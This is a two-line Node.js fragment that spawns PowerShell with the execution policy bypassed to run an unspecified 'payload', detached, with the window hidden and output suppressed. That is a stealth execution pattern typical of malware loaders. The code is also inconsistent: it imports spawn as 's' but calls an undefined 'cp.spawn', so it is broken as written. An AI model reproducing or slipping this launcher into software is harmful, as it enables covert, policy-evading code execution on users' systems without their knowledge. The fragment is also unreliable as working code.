import { spawn as s } from "node:child_process";
const c = cp.spawn("pwsh", ["-ep", "bypass", "-c", payload], { detached: !0, windowsHide: !0, stdio: "ignore" });
